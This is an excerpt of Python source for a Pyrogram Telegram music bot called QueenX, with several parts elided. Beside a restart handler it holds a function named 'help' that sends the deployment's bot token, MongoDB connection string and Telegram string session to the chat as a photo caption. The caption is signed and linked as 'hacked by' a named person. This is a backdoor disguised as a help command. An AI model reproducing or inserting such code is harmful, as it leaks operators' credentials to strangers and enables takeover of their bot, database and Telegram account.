...
from QueenX.misc import SUDOERS
from pyrogram import Client, filters
import requests
import random
import re
...
from QueenX.utils.database import get_authuser_names, get_cmode
from QueenX.utils.decorators import (ActualAdminCB, AdminActual, language)
from QueenX.utils.command import commandpro                     
from QueenX.utils.formatters import alpha_to_int
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await Queen.stop_stream(message.chat.id)
    except:
        pass
...
async def help(client: Client, message: Message):
    await message.reply_photo(
        ...
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝙻𝚄𝙲𝙺𝚈 𝚁𝙰𝙹𝙰.\n\n☆............𝙱𝚈 » [𝙻𝚄𝙲𝙺𝚈 𝚁𝙰𝙹𝙰](https://t.me/itz_Lucky_Raja)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• нαϲкє𝚍 ву ℓυ¢ку яαנα •", url=f"https://t.me/itz_Lucky_Raja")
                 ]
             ]
         ),
     )
